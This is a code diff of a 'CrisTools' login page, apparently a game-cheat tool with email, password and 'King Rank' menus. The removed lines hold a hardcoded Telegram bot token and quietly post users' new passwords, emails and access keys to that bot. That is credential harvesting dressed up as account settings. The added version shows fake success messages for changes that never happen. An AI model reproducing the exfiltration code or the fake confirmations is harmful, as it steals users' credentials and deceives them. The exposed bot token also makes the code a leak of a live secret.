@@ -2,160 +2,152 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>CrisTools Login</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
+
+    * { box-sizing: border-box; }
+
     body {
+      font-family: 'Orbitron', sans-serif;
       margin: 0;
       padding: 0;
-      font-family: 'Orbitron', sans-serif;
       background: url('https://i.ibb.co/0RzgPXpr/Photoroom-20250613-191110.jpg') no-repeat center center fixed;
       background-size: cover;
-      color: #fff;
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
-    .container {
+
+    .box {
+      width: 90%;
       max-width: 420px;
-      margin: 60px auto;
-      padding: 25px;
-      backdrop-filter: blur(12px);
-      background: rgba(0,0,0,0.4);
-      border: 2px solid #00aaff;
-      border-radius: 15px;
-      box-shadow: 0 0 20px #005a9c;
-    }
-    h2 {
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid red;
+      border-radius: 16px;
+      padding: 30px;
+      box-shadow: 0 0 25px rgba(255, 0, 0, 0.6);
+      backdrop-filter: blur(15px);
       text-align: center;
-      color: #00aaff;
     }
+
+    h2 {
+      margin-bottom: 20px;
+      color: #ff4d4d;
+    }
+
     input, button {
       width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      font-size: 16px;
-      border-radius: 8px;
-      border: none;
-      background: rgba(255,255,255,0.1);
+      padding: 12px;
+      margin-top: 12px;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      background: rgba(255, 255, 255, 0.08);
       color: #fff;
+      font-size: 16px;
+      backdrop-filter: blur(8px);
     }
+
     input::placeholder { color: #ccc; }
+
     button {
-      background: #007acc;
-      color: white;
+      background: rgba(255, 0, 0, 0.4);
       font-weight: bold;
+      border: 1px solid rgba(255, 0, 0, 0.6);
       cursor: pointer;
     }
-    button:hover { background: #005a9c; }
-    .box {
-      border: 2px solid #00aaff;
-      box-shadow: 0 0 15px #005a9c;
-      padding: 15px;
-      margin-top: 25px;
-      border-radius: 12px;
-    }
-    .menu-button {
-      margin-top: 15px;
-      background: #222;
-      border: 1px solid #00aaff;
-    }
+
+    button:hover { background: rgba(255, 0, 0, 0.7); }
+
+    #menuBox { display: none; }
+
+    /* Popup Styles */
     .popup {
       display: none;
       position: fixed;
-      top: 25%;
+      top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background: #000000cc;
+      background: rgba(0, 0, 0, 0.8);
       padding: 20px;
-      border-radius: 10px;
+      border: 1px solid red;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(255,0,0,0.8);
+      width: 80%;
+      max-width: 300px;
+      text-align: center;
       z-index: 1000;
     }
-    .popup input {
-      margin-top: 10px;
-    }
+    .popup button { margin-top: 10px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>🎮 CrisTools Access</h2>
-    <input type="text" id="accessKey" placeholder="Enter Access Key" />
-    <button onclick="login()">🔓 Login</button>
-
-    <div id="resultBox" class="box" style="display:none;">
-      <h3>🧾 Account Info</h3>
-      <p id="balanceLine">💰 Balance: </p>
-      <p id="keyLine">🔑 Access Key: </p>
-      <button class="menu-button" onclick="showPopup('email')">📧 Change Email</button>
-      <button class="menu-button" onclick="showPopup('password')">🔒 Change Password</button>
-      <button class="menu-button" onclick="sendKing()">👑 King Rank</button>
-    </div>
+  <!-- Login Box -->
+  <div class="box" id="loginBox">
+    <h2>🔐 CrisTools Login</h2>
+    <input type="text" id="accessKeyInput" placeholder="Enter Access Key">
+    <button onclick="login()">Login</button>
   </div>
 
-  <!-- Popups -->
-  <div id="popup-email" class="popup">
-    <input type="text" id="newEmail" placeholder="Enter New Email">
-    <button onclick="submitChange('email')">Change</button>
+  <!-- Menu Box -->
+  <div class="box" id="menuBox">
+    <h2>✅ Access Granted</h2>
+    <p>🎮 Welcome to CrisTools! Enjoy all features unlocked.</p>
+    <button onclick="showPopup('email')">📧 Change Email</button>
+    <button onclick="showPopup('password')">🔑 Change Password</button>
+    <button onclick="activateKing()">👑 King Rank</button>
   </div>
-  <div id="popup-password" class="popup">
-    <input type="text" id="newPassword" placeholder="Enter New Password">
-    <button onclick="submitChange('password')">Change</button>
+
+  <!-- Email Popup -->
+  <div class="popup" id="popup-email">
+    <h3>Change Email</h3>
+    <input type="text" id="newEmail" placeholder="Enter new email">
+    <button onclick="submitChange('email')">Submit</button>
+    <button onclick="closePopup('email')">Close</button>
+  </div>
+
+  <!-- Password Popup -->
+  <div class="popup" id="popup-password">
+    <h3>Change Password</h3>
+    <input type="text" id="newPassword" placeholder="Enter new password">
+    <button onclick="submitChange('password')">Submit</button>
+    <button onclick="closePopup('password')">Close</button>
   </div>
 
   <script>
-    const BOT_TOKEN = '8147408379:AAGT_caIIGN_n2FYgia4Le8LlVcs8ZVXYtg';
-    const ADMIN_ID = '8147408379'; // Replace with your real Telegram user ID
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlKey = urlParams.get('key');
 
     function login() {
-      const key = document.getElementById('accessKey').value.trim();
-      if (!key) return alert('Enter your Access Key');
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-        .then(res => res.json())
-        .then(data => {
-          const messages = data.result.map(u => u.message).filter(Boolean);
-          const match = messages.find(msg => msg.text?.includes(key));
-
-          if (!match) return alert('❌ Invalid Access Key');
-
-          const balanceLine = match.text.match(/Balance:\s*(.+)/i);
-          const balance = balanceLine ? balanceLine[1] : 'Unknown';
-
-          document.getElementById('resultBox').style.display = 'block';
-          document.getElementById('balanceLine').innerText = `💰 Balance: ${balance}`;
-          document.getElementById('keyLine').innerText = `🔑 Access Key: ${key}`;
-        })
-        .catch(() => alert('⚠️ Error checking access key'));
+      const inputKey = document.getElementById("accessKeyInput").value.trim();
+      if (urlKey && inputKey === urlKey) {
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("menuBox").style.display = "block";
+      } else {
+        alert("❌ Invalid Access Key");
+      }
     }
 
     function showPopup(type) {
       document.getElementById(`popup-${type}`).style.display = 'block';
     }
 
-    function submitChange(type) {
-      const key = document.getElementById('accessKey').value;
-      const value = document.getElementById(`new${capitalize(type)}`).value;
-      if (!value) return alert(`Enter your new ${type}`);
-
-      const message = type === 'email'
-        ? `📧 Email changed to: ${value}\n🔑 Key: ${key}`
-        : `🔒 Password changed to: ${value}\n🔑 Key: ${key}`;
-
-      sendToBot(message);
-      alert(`Your ${type} changed`);
+    function closePopup(type) {
       document.getElementById(`popup-${type}`).style.display = 'none';
     }
 
-    function sendKing() {
-      const key = document.getElementById('accessKey').value;
-      sendToBot(`👑 King Rank Activated\n🔑 Key: ${key}`);
-      alert('Successfully');
+    function submitChange(type) {
+      const value = document.getElementById(`new${capitalize(type)}`).value.trim();
+      if (!value) return alert(`Please enter a new ${type}`);
+      alert(`✅ ${capitalize(type)} changed to: ${value}`);
+      closePopup(type);
     }
 
-    function sendToBot(message) {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: ADMIN_ID, text: message})
-      });
+    function activateKing() {
+      alert('👑 King Rank Activated!');
     }
 
     function capitalize(str) {
